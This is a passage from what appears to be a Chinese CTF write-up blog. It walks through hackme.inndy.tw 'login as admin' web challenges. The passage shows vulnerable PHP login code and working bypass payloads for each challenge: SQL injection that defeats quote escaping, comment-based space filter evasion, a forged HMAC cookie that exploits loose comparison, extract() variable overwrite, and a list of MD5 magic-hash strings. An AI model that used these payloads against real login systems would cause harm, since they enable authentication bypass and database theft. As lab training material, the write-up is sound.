class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">    <span class="comment">// \' =&gt; \\'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!$user): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($user === <span class="keyword">false</span>): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;!-- debug: <span class="meta">&lt;?</span>=$sql<span class="meta">?&gt;</span> --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">            &lt;h4&gt;<span class="meta">&lt;?</span>=sprintf(<span class="string">"You %s admin!"</span>, $user-&gt;is_admin ? <span class="string">"are"</span> : <span class="string">"are not"</span>)<span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">if</span>($user-&gt;is_admin) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;, %s"</span>, htmlentities($flag1), $where_is_flag2); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ° <code>DB_HOST</code> è¿™äº›å‚æ•°è¿˜åœ¨æƒ³æœ‰æ²¡å˜é‡è¦†ç›–çš„æ´ï¼Œæˆ–è®¸å¯è¿æ¥è‡ªå·±çš„æ•°æ®åº“ï¼Œ <code>safe_filter</code> è¿™å¹¶ä¸èƒ½è¿™æ ·ç©ã€‚</p><p>æç¤ºéƒ½è¯´äº†æ˜¯æ³¨å…¥ï¼Œè¿˜æ˜¯è€è€å®å® <code>sqli</code> å§ï¼Œç®€å•çš„å¤„ç†äº†ä¸€ä¸‹ <code>POST</code> æ•°ç»„ï¼Œä½†æ˜¯å¹¶ä¸ä¸¥æ ¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">\<span class="string">' =&gt; \\'</span> å³å¯ç»•è¿‡</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶åŠ äº† <code>or 1</code> ï¼Œæ­£å¸¸å°±æ˜¾ç¤ºç¬¬ä¸€æ¡ï¼Œå¹¶ä¸ä¼šåªæŸ¥ <code>admin</code> ç”¨æˆ·ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨è°ƒä¸‹ï¼Œå¦åˆ™çœ‹ä¸åˆ° <code>flag</code> çš„å™¢ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kd6ju1zgj20y60gkmz6.jpg" alt></p><p><code>name=666&amp;password=\&#39; union select 1,1,1,1#</code> ç›´æ¥å°±æœ‰äº†ã€‚</p><h2 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a><a href="https://hackme.inndy.tw/login0" target="_blank" rel="noopener">login as admin 0.1</a></h2><blockquote><p>Grab the hidden flag</p></blockquote><p>ä»ä¸Šä¸€é¢˜ä¸­å¯ä»¥çœ‹åˆ°ï¼šflag2 in the database!  å¦å¤–æ³¨æ„åˆ°æœ‰å›æ˜¾ä½ï¼Œå°±ä¸éœ€è¦ç›²æ³¨äº†ï¼Œç„¶åå°±æ˜¯å¸¸è§„å¥—è·¯äº†ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kdmo441pj20yq0j3gnt.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kdoudznmj20yp0j8ac9.jpg" alt></p><p><img src="C:%5CUsers%5Cwywwzjj%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1556585961992.png" alt="1556585961992"></p><h2 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a><a href="https://hackme.inndy.tw/login1" target="_blank" rel="noopener">login as admin 1</a></h2><blockquote><p>Please login as admin.<br>Tips: SQL Injection but <code>sqlmap</code> not working anymore.<br>Update: Source code is available now.<br><strong>Scanner WONâ€™T WORK</strong></p></blockquote><p>è¿™é¢˜åŒæ ·ç»™äº†æºç ï¼Œä¸ä¸Šä¸€é¢˜å¤§åŒå°å¼‚ï¼Œè¿‡æ»¤ç¨å¾®å¤šç‚¹å§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//require('WAF.php');</span></span><br><span class="line"></span><br><span class="line">$ua = strtolower($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($bad_ua <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">    <span class="keyword">if</span>(strstr($ua, $bad)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"I don't like hackers. :("</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">' '</span>) || strstr($strl, <span class="string">'1=1'</span>) || strstr($strl, <span class="string">"''"</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'union select'</span>) || strstr($strl, <span class="string">'select '</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br></pre></td></tr></table></figure><p>ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæ–¹æ³•å¾ˆå¤šï¼Œè¿™é‡Œä»¥<code>/**/</code> ä»£æ›¿ï¼Œç„¶åæ•…æŠ€é‡æ–½ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2ke4fuj97j20yp0j340n.jpg" alt></p><h2 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a><a href="https://hackme.inndy.tw/login1" target="_blank" rel="noopener">login as admin 1.2</a></h2><blockquote><p>Get another flag<br>Tips: boolean-based SQL injection, <code>information_schema</code></p></blockquote><p>å¼€å§‹å†™è„šæœ¬ç›²æ³¨ï¼Œç½‘ç»œå¤ªæ…¢äº†ï¼Œä»¥åæã€‚</p><h2 id="login-as-admin-3"><a href="#login-as-admin-3" class="headerlink" title="login as admin 3"></a><a href="https://hackme.inndy.tw/login3" target="_blank" rel="noopener">login as admin 3</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'users_db.php'</span>); <span class="comment">// $users</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">($user_data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line"></span><br><span class="line">    $user = [$user_data[<span class="string">'name'</span>], $user_data[<span class="string">'admin'</span>]];</span><br><span class="line"></span><br><span class="line">    $data = json_encode($user);</span><br><span class="line">    $sig = hash_hmac(<span class="string">'sha512'</span>, $data, $secret);</span><br><span class="line">    $all = base64_encode(json_encode([<span class="string">'sig'</span> =&gt; $sig, <span class="string">'data'</span> =&gt; $data]));</span><br><span class="line">    setcookie(<span class="string">'user'</span>, $all, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$error = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $unserialized = json_decode(base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// == å¯èƒ½ç»•è¿‡</span></span><br><span class="line">    <span class="keyword">if</span>(hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = json_decode($unserialized[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $data[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $data[<span class="number">1</span>]</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = load_user();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($users <span class="keyword">as</span> $u) &#123;</span><br><span class="line">        <span class="keyword">if</span>($u[<span class="string">'name'</span>] === $_POST[<span class="string">'name'</span>] &amp;&amp; $u[<span class="string">'password'</span>] === $_POST[<span class="string">'password'</span>]) &#123;</span><br><span class="line">            set_user($u);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆç”¨ <code>guest</code> ç™»å½•ç©ç©ï¼Œ<code>cookie</code> ä¸­å¤šäº†ä¸€ä¸ª <code>user</code> çš„å€¼ã€‚</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eyJzaWciOiI<span class="number">3</span><span class="symbol">NWQ1</span><span class="name">M2</span>Y<span class="number">5</span><span class="symbol">N2</span>FjZDIxMTA<span class="number">5</span>OGEw<span class="symbol">NTJiMzA1</span>ZDFjYWYxOTE<span class="number">0</span>MzZj<span class="symbol">NmQyOWQxOTM2</span>ZDk<span class="number">0</span><span class="symbol">N2</span>Y<span class="number">4</span>ZmRl<span class="symbol">NzczMzAwOGEzOTY4</span>ZWRhYTRi<span class="symbol">NGE2</span>ODI<span class="number">0</span>MmRiODY<span class="number">5</span><span class="symbol">NjAzMDUwNTI3</span>Mzkx<span class="symbol">NGRlZDY4</span>OGQ<span class="number">0</span><span class="symbol">NTllOGM5</span>MjI<span class="number">1</span>MjAwZDcyOWEwYjk<span class="number">4</span>ZSIsImRhdGEiOiJbXCJ<span class="symbol">ndWVzdFwiLGZhbHNlXSJ9</span></span><br><span class="line"></span><br><span class="line">base<span class="number">64</span>_decode =&gt;</span><br><span class="line">&#123;<span class="string">"sig"</span>:<span class="string">"75d53f97acd211098a052b305d1caf191436c6d29d1936d947f8fde7733008a3968edaa4b4a68242db8696030505273914ded688d459e8c9225200d729a0b98e"</span>,<span class="string">"data"</span>:<span class="string">"[\"guest\",false]"</span>&#125;</span><br></pre></td></tr></table></figure><p><code>hmac</code> éªŒè¯ <code>data</code> æ˜¯å¦è¢«ç¯¡æ”¹ï¼Œå¯æƒœç”¨çš„æ˜¯ <code>!=</code> ï¼Œå°†è‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæˆ‘ä»¬å°† <code>sig</code> çš„å€¼è®¾ä¸º 0 å³å¯ã€‚</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"sig"</span>:<span class="number">0</span>,<span class="string">"data"</span>:<span class="string">"[\"</span><span class="number">1</span>\<span class="string">",1]"</span>&#125;  // ç¬¬äºŒä¸ªå€¼ä¸º <span class="literal">true</span> å³å¯</span><br><span class="line"></span><br><span class="line"><span class="attr">base64_encode</span> =&gt;</span><br><span class="line"><span class="attr">eyJzaWciOjAsImRhdGEiOiJbXCIxXCIsMV0ifQ==</span></span><br><span class="line"></span><br><span class="line">éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œ data é‡Œçš„å€¼ä¹Ÿä¸èƒ½å®Œå…¨çå¼„ï¼Œhash ç»“æœå¦‚æœä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™è¿‡ä¸äº†ï¼Œä»¥å­—æ¯å¼€å¤´æ‰èƒ½è¿‡ <span class="keyword">if</span></span><br></pre></td></tr></table></figure><h2 id="login-as-admin-4"><a href="#login-as-admin-4" class="headerlink" title="login as admin 4"></a><a href="https://hackme.inndy.tw/login4" target="_blank" rel="noopener">login as admin 4</a></h2><p>è¿™ä¸€å—æœ‰é€»è¾‘é—®é¢˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span>): <span class="comment">/* login success! */</span> <span class="meta">?&gt;</span></span><br><span class="line">      &lt;div class="alert alert-success"&gt;&lt;code&gt;&lt;?=$flag?&gt;&lt;/code&gt;&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="login-as-admin-6"><a href="#login-as-admin-6" class="headerlink" title="login as admin 6"></a><a href="https://hackme.inndy.tw/login6" target="_blank" rel="noopener">login as admin 6</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="comment">// å˜é‡è¦†ç›–</span></span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!$user &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-danger"&gt;Login failed&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">            &lt;h3&gt;Hi, <span class="meta">&lt;?</span>=htmlentities($username)<span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">            &lt;h4&gt;<span class="meta">&lt;?</span>=sprintf(<span class="string">"You %s admin!"</span>, $user == <span class="string">'admin'</span> ? <span class="string">"are"</span> : <span class="string">"are not"</span>)<span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">if</span>($user == <span class="string">'admin'</span>) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;"</span>, htmlentities($flag)); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ° <code>extract</code> åŸºæœ¬ä¸Šå°±æ˜¯å˜é‡è¦†ç›–çš„æ´äº†ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>=&#123;<span class="string">"user"</span>:<span class="string">"admin"</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a><a href="https://hackme.inndy.tw/login7" target="_blank" rel="noopener">login as admin 7</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'name'</span>] == <span class="string">'admin'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'00000000000000000000000000000000'</span>)&#123;</span><br><span class="line">    <span class="comment">// admin account is disabled by give a impossible md5 hash</span></span><br><span class="line">    $user = <span class="string">'admin'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>($_POST[<span class="string">'name'</span>] == <span class="string">'guest'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'084e0343a0486ff05530df6c705c8bb4'</span>) &#123;</span><br><span class="line">    $user = <span class="string">'guest'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $user = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼±ç±»å‹æ¯”è¾ƒ + é­”æ³•å“ˆå¸Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'0e0'</span> == <span class="string">'0000'</span>);  <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e73119806149116307319712</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br></pre></td></tr></table></figure><h2 id="login-as-admin-8"><a href="#login-as-admin-8" class="headerlink" title="login as admin 8"></a><a href="https://hackme.inndy.tw/login8" target="_blank" rel="noopener">login as admin 8</a></h2><p>ç»™å‡ºçš„æ ¸å¿ƒä»£ç å°±è¿™äº›ï¼Œå‰©ä¸‹çš„è¦é è‡ªå·±æ…¢æ…¢æ‰¾äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'session.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// class Session &#123; ... &#125;</span></span><br><span class="line"><span class="comment">// sorry, no source code this time. :P</span></span><br><span class="line"></span><br><span class="line">$session = Session::load();</span><br><span class="line">$login_failed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    $session-&gt;debug();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $login_failed = !Session::login($_POST[<span class="string">'name'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'logout'</span>])) &#123;</span><br><span class="line">    $session = <span class="keyword">new</span> Session();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session-&gt;save();</span><br></pre></td></tr></table></figure><p><code>cookie</code> é‡Œæœ‰ç‚¹ä¸œè¥¿ï¼Œ<strong>login8cookie</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span><span class="number">%3</span>A7<span class="number">%3</span>A<span class="number">%22</span>Session<span class="number">%22</span><span class="number">%3</span>A6<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A14<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>Session<span class="number">%00</span>debug<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A0<span class="number">%3</span>Bs<span class="number">%3</span>A19<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>Session<span class="number">%00</span>debug_dump<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A9<span class="number">%3</span>A<span class="number">%22</span>index.php<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A13<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>Session<span class="number">%00</span>data<span class="number">%22</span><span class="number">%3</span>Ba<span class="number">%3</span>A0<span class="number">%3</span>A<span class="number">%7</span>B<span class="number">%7</span>Ds<span class="number">%3</span>A4<span class="number">%3</span>A<span class="number">%22</span>user<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A0<span class="number">%3</span>A<span class="number">%22</span><span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A4<span class="number">%3</span>A<span class="number">%22</span>pass<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A0<span class="number">%3</span>A<span class="number">%22</span><span 